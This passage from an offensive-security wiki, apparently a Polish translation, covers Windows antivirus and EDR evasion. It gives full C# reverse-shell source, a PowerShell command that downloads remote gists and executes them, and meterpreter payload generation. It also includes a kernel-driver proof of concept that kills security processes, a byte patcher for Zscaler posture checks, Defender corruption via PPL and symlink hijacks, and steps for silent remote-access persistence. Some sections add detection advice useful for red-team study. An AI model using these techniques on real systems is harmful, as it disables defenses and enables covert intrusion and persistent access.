- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekonwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że executables podpisane za pomocą **trusted** signing certificate **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem, by zapobiec przypisaniu payloads Mark of The Web, jest zapakowanie ich w jakiś kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do **non NTFS** woluminów.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do output containers, by ominąć Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym na **logowanie zdarzeń**. Jednak może być także wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku omijania AMSI, możliwe jest sprawienie, by funkcja użytkowego procesu **`EtwEventWrite`** zwracała natychmiast, nie zapisując żadnych zdarzeń. Robi się to przez patchowanie funkcji w pamięci tak, aby natychmiast zwracała, efektywnie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, jedyną rzeczą, o którą będziemy musieli się martwić, jest patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już oferuje możliwość wykonywania assembly C# bezpośrednio w pamięci, ale istnieją różne sposoby ich uruchamiania:

- **Fork\&Run**

Polega na **uruchomieniu nowego, „ofiarnego” procesu**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu kodu, a po zakończeniu zabiciu procesu. Ma to zarówno zalety, jak i wady. Zaleta metody fork and run jest taka, że wykonanie odbywa się **poza** naszym procesem implantatu Beacon. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **znacznie większe ryzyko** **utraty beacona**, ponieważ proces może się zawiesić lub wyjść z błędem.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest uruchamianie złośliwego kodu przy użyciu innych języków poprzez zapewnienie maszynie ofiary dostępu do środowiska interpretera zainstalowanego na Attacker Controlled SMB share.

Poprzez udostępnienie dostępu do Interpreter Binaries i środowiska na SMB share możesz **execute arbitrary code in these languages within memory** maszyny, którą przejęto.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd. mamy **more flexibility to bypass static signatures**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access tokenem lub produktem bezpieczeństwa takim jak EDR czy AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zakończy się, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **zabronić procesom zewnętrznym** uzyskiwania uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz z https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga na parametr pin, który pozwala ustawić PIN bez używania GUI).

## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasami trzeba brać pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wykładu od [@ATTL4S](https://twitter.com/DaniLJ94), aby zapoznać się z bardziej zaawansowanymi technikami unikania detekcji.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetny wykład od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwał części binarki** aż **zidentyfikuje, którą część Defender** uznaje za złośliwą i rozdzieli ją dla Ciebie.\
Inne narzędzie robiące **to samo to** [**avred**](https://github.com/dobin/avred) z otwartą usługą web dostępną pod [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, wszystkie wersje Windows zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby się **uruchamiał** przy starcie systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (stealth) i wyłącz zaporę:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz wersje binarne do pobrania, nie instalator)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj server:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ do **victim**

#### **Reverse connection**

**attacker** powinien **execute inside** swojego **host** uruchomić binarkę `vncviewer.exe -listen 5900`, aby była **prepared** do przechwycenia odwrotnego **VNC connection**. Następnie, na **victim**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować stealth nie wykonuj kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywoła to [popup](https://i.imgur.com/1SROTTl.png). sprawdź czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom listera** poleceniem `msfconsole -r file.rc` i **wykonaj** **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Kompilator C# using
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchomienie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Używanie python do przykładu tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktu końcowego przed zrzuceniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *signed* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nawet usługi AV z Protected-Process-Light (PPL) nie mogą zablokować.

Kluczowe wnioski
1. **Podpisany sterownik**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarium to legalnie podpisany sterownik `AToolsKrnl64.sys` z Antiy Labs’ “System In-Depth Analysis Toolkit”. Ponieważ sterownik posiada ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga ją uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończ dowolny proces po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usuń dowolny plik na dysku |
| `0x990001D0` | Odładuj sterownik i usuń usługę |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD pomija całkowicie ochrony w trybie użytkownika; kod wykonujący się w jądrze może otwierać *protected* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów umocnień.

Wykrywanie / Mitigacja
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *kernel* usług i generuj alerty, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub gdy nie znajduje się na liście dozwolonych.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** stosuje zasady postawy urządzenia lokalnie i polega na Windows RPC do komunikowania wyników innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **w całości po stronie klienta** (wysyłana jest wartość boolowska do serwera).  
2. Wewnętrzne endpointy RPC jedynie weryfikują, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (przez `WinVerifyTrust`).

Poprzez **patchowanie czterech podpisanych binariów na dysku** obie mechaniki można zneutralizować:

| Plik | Oryginalna logika zmieniona | Rezultat |
|------|-----------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ każdy (nawet niepodpisany) proces może przyłączyć się do pipe'ów RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Pominięte |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **All** posture checks display **green/compliant**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zainfekowany host zyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto po stronie klienta decyzje zaufania i proste weryfikacje podpisów można przełamać kilkoma poprawkami bajtowymi.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) egzekwuje hierarchię signer/level tak, że tylko procesy chronione o równym lub wyższym poziomie mogą modyfikować inne. Ofensywnie, jeśli możesz legalnie uruchomić binarium z włączonym PPL i kontrolować jego argumenty, możesz przekształcić benign funkcjonalność (np. logging) w ograniczony, wsparty PPL prymityw zapisu do chronionych katalogów używanych przez AV/EDR.

Co powoduje, że proces działa jako PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- Proces musi być utworzony przy użyciu CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego poziomu ochrony, który pasuje do podpisującego binarium (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla signerów anty-malware, `PROTECTION_LEVEL_WINDOWS` dla signerów Windows). Nieprawidłowe poziomy spowodują błąd przy tworzeniu.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Prymityw LOLBIN: ClipUp.exe
- Podpisany systemowy binarny `C:\Windows\System32\ClipUp.exe` sam się uruchamia i akceptuje parametr do zapisania pliku logu na ścieżce wskazanej przez wywołującego.
- Jeśli uruchomiony jako proces PPL, zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj ścieżek 8.3, aby wskazać lokalizacje normalnie chronione.

8.3 short path helpers
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Uzyskaj krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (zarys)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) za pomocą `CREATE_PROTECTED_PROCESS` przy użyciu launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj nazw 8.3.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zajęty przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy uruchomieniu systemu przed startem AV poprzez zainstalowanie usługi autostartu, która uruchamia się wcześniej. Zweryfikuj kolejność startu za pomocą Process Monitor (boot logging).
4) Po restarcie zapis z uprawnieniami PPL następuje przed zablokowaniem binarek przez AV, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Przykład wywołania (ścieżki skrócone/ukryte dla bezpieczeństwa):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie można kontrolować zawartości, którą zapisuje ClipUp poza lokalizacją; prymityw nadaje się bardziej do korumpowania niż precyzyjnego wstrzykiwania treści.
- Wymaga uprawnień lokalnego administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na ponowne uruchomienie.
- Czas jest krytyczny: cel nie może być otwarty; wykonanie podczas rozruchu unika blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie jeśli parentowane przez niestandardowe launchery, w okolicach rozruchu.
- Nowe usługi skonfigurowane do auto-startu podejrzanych binariów i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów uruchamiania Defender.
- Monitorowanie integralności plików dla binariów Defender/katologów Platform; nieoczekiwane tworzenia/modyfikacje plików przez procesy z protected-process flags.
- ETW/EDR telemetry: szukaj procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnej użycia poziomów PPL przez binaria niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binaria mogą działać jako PPL i pod jakimi parentami; zablokuj wywoływanie ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług auto-start i monitoruj manipulacje kolejnością startu.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadaj błędy uruchamiania wskazujące na korupcję binariów.
- Rozważ wyłączenie generowania krótkich nazw w formacie 8.3 na woluminach hostujących narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

Referencje dla PPL i narzędzi
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulacja Microsoft Defender poprzez Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, poprzez enumerację podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z leksykograficznie najwyższym stringiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia procesy usługi Defender stamtąd (aktualizując odpowiednio ścieżki usług/rejestru). Ten wybór ufa wpisom katalogów, w tym punktom reparse (symlinks). Administrator może to wykorzystać, aby przekierować Defender do ścieżki zapisywalnej przez atakującego i osiągnąć DLL sideloading lub zakłócenie działania usługi.

Warunki wstępne
- Lokalny Administrator (wymagany do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia lub wymuszenia ponownego wyboru platformy Defender (restart usługi przy starcie)
- Wystarczą tylko narzędzia wbudowane (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych folderach, ale jego wybór platformy ufa wpisom katalogów i wybiera leksykograficznie najwyższą wersję bez weryfikacji, czy cel rozwiązuje się do chronionej/zaufanej ścieżki.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na swój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger selection (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/registry odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Umieść lub zastąp DLLs, które Defender ładuje z katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
